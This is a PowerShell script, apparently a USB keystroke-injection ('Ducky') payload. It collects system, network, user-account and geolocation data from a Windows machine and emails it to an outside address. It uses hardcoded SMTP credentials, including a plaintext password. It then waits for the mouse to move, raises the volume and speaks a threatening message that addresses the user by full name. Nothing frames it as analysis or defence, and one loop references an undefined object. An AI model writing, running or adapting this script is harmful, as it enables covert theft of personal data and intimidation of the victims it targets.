
Try {
    $SystemInfo = [PSCustomObject]@{
        OS_Details = Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture
        System_Details = Get-WmiObject -Class Win32_ComputerSystem | Select-Object Model, Manufacturer, SystemType, TotalPhysicalMemory
        IP_Configuration = Get-NetIPAddress | Select-Object IPAddress, InterfaceAlias, AddressFamily
        Network_Adapters = Get-NetAdapter | Select-Object Name, Status, MacAddress, LinkSpeed
        DNS_Configuration = Get-DnsClientServerAddress | Select-Object InterfaceAlias, ServerAddresses
        CPU_Info = Get-WmiObject -Class Win32_Processor | Select-Object Name, NumberOfCores, MaxClockSpeed
        Disk_Info = Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, VolumeName, Size, FreeSpace
        USB_Devices = Get-WmiObject -Class Win32_USBHub | Select-Object Name, DeviceID, Status
        User_Accounts = Get-LocalUser | Select-Object Name, Enabled, LastLogon
        Logged_On_Users = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -ExpandProperty UserName
    }
    $SystemInfoJson = $SystemInfo | ConvertTo-Json -Depth 10
    $ipInfo = Invoke-RestMethod -Uri 'http://ipinfo.io/json'
    $jsonContent = $ipInfo | ConvertTo-Json -Depth 10
    $Message = "Geolocation Data:`r`n$jsonContent`r`n`r`nSystem Information:`r`n$SystemInfoJson"
    $EmailFrom = "usulmadhi@outlook.fr"
    $EmailTo = "UsulMadhi@proton.me"
    $Subject = "Geo Data Ducky"
    $Body = $Message
    $SMTPServer = "smtp.outlook.com"
    $SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
    $SMTPClient.EnableSsl = $true
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("usulmadhi@outlook.fr", "Eusebe2000")
    $SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
    Write-Host "Email sent successfully!"
}

Catch {
    Write-Host "Error sending email: $_"
}

function Get-fullName {

    try {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

    }
 
 # If no name is detected function will return $env:UserName 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName 

}

$FN = Get-fullName

Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
echo "it worked"

$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
$s=New-Object -ComObject SAPI.SpVoice
$s.Rate = -2
$s.Speak("We found you $FN")
$s.Speak("We know where you are")
$s.Speak("We are everywhere")
$s.Speak("Expect us")